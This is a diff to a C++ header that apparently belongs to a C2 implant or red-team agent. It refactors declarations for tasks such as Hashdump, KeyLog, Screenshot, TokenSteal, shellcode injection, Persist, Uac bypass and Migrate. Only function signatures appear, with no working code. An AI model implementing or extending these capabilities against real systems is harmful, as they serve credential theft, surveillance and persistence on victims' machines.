@@ -4,18 +4,17 @@
 #include <winsock2.h>
 
 #include "core/macros.hpp"
-#include "core/win32.hpp"
 #include "core/state.hpp"
 #include "core/stdout.hpp"
 #include "core/system.hpp"
 #include "core/technique.hpp"
 #include "core/utils.hpp"
+#include "core/win32.hpp"
 
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <dbghelp.h>
 #include <gdiplus.h>
-#include <iphlpapi.h>
 #include <psapi.h>
 #include <strsafe.h>
 #include <synchapi.h>
@@ -98,7 +97,11 @@ namespace Task
 
     namespace Helper::Hashdump
     {
-        BOOL SaveRegHive(const std::wstring& wHiveKey, const std::wstring& wSavePath);
+        BOOL SaveRegHive(
+            Procs::PPROCS pProcs,
+            const std::wstring& wHiveKey,
+            const std::wstring& wSavePath
+        );
     }
 
     namespace Helper::KeyLog
@@ -115,14 +118,14 @@ namespace Task
 
     namespace Helper::Screenshot
     {
-        BOOL InitInstance(HINSTANCE hInstance, INT nCmdShow);
+        BOOL InitInstance(Procs::PPROCS pProcs, HINSTANCE hInstance, INT nCmdShow);
         // INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
         INT GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
         BOOL BmpToPng();
         BOOL DeleteBmp();
         int CaptureAnImage(HWND hWnd);
         LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
-        ATOM MyRegisterClass(HINSTANCE hInstance);
+        ATOM MyRegisterClass(Procs::PPROCS pProcs, HINSTANCE hInstance);
     }
 
     namespace Helper::Token
@@ -143,16 +146,16 @@ namespace Task
     std::wstring GroupLs(State::PSTATE pState);
     std::wstring Hashdump(State::PSTATE pState);
     std::wstring History(State::PSTATE pState);
-    std::wstring Ip();
+    std::wstring Ip(State::PSTATE pState);
     std::wstring JitterSet(State::PSTATE pState, const std::wstring& wJitter);
-    std::wstring KeyLog(const std::wstring& wLogTime);
+    std::wstring KeyLog(State::PSTATE pState, const std::wstring& wLogTime);
     std::wstring Kill(State::PSTATE pState);
     std::wstring KillDateSet(State::PSTATE pState, const std::wstring& wKillDate);
     std::wstring Ls(State::PSTATE pState, const std::wstring& wDir);
     std::wstring Migrate(State::PSTATE pState, const std::wstring& wPid);
     std::wstring Mkdir(State::PSTATE pState, const std::wstring& wDir);
     std::wstring Mv(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
-    std::wstring Net();
+    std::wstring Net(State::PSTATE pState);
     std::wstring Pe(State::PSTATE pState, const std::wstring& wTargetProcess, const std::wstring& wSrc, const std::wstring& wTechnique);
     std::wstring Persist(State::PSTATE pState, const std::wstring& wTechnique);
     std::wstring Procdump(State::PSTATE pState, const std::wstring& wPid);
@@ -161,7 +164,7 @@ namespace Task
     std::wstring Pwd(State::PSTATE pState);
     std::wstring RegQuery(State::PSTATE pState, const std::wstring& wRootKey, const std::wstring& wSubKey, BOOL bRecursive);
     std::wstring Rm(State::PSTATE pState, const std::wstring& wFile);
-    std::wstring Rmdir(const std::wstring& wDir);
+    std::wstring Rmdir(State::PSTATE pState, const std::wstring& wDir);
     std::wstring RportfwdAdd(State::PSTATE pState, const std::wstring& wLIP, const std::wstring& wLPort, const std::wstring& wFwdIP, const std::wstring& wFwdPort);
     std::wstring RportfwdLs(State::PSTATE pState);
     std::wstring RportfwdRm(State::PSTATE pState);
@@ -169,7 +172,7 @@ namespace Task
     std::wstring Screenshot(State::PSTATE pState);
     std::wstring Shellcode(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc, const std::wstring& wTechnique);
     std::wstring SleepSet(State::PSTATE pState, const std::wstring& wSleep);
-    std::wstring TokenRevert();
+    std::wstring TokenRevert(State::PSTATE pState);
     std::wstring TokenSteal(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wProcName, bool bLogin);
     std::wstring Uac(State::PSTATE pState, const std::wstring& wTechnique);
     std::wstring Upload(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
